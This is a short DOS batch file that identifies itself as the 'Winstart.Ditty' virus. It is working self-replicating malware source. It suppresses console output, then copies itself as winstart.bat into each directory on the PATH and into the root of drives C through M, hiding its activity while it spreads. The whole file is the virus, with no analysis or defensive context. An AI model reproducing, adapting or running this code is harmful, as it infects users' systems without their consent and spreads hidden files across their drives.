@echo off
REM Winstart.Ditty Virus by -=Q=-
if "%1"=="/" goto set_name
%comspec% /e:2048 /c%0.bat / %path%
goto end
:set_name
set ditty=%0
ctty nul
:loop
if "%2"=="" goto copy_here
if exist %2\nul if not exist %2\winstart.bat copy %ditty% %2
shift
goto loop
:copy_here
for %%a in (c d e f g h i j k l m) do if exist %%a:\nul if not exist %%a:winstart.bat copy %ditty% %%a:
ctty con
:end
